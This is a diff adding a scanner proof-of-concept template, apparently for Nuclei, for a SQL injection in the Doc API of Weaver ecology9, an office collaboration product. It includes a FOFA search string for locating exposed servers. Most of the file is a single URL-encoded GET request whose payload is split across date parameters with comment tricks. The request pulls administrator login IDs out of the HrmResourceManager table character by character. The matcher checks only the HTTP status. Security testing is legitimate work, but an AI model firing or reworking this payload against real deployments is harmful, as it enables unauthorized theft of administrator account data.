@@ -1,0 +1,21 @@
+id: poc-pr6w1dthf6p43hwk
+info:
+  name: 泛微ecology9 Doc存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pr6w1dthf6p43hwk'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pr6w1dthf6p43hwk
+    fofa: app="泛微-协同商务系统"
+http:
+- raw:
+  - 'GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
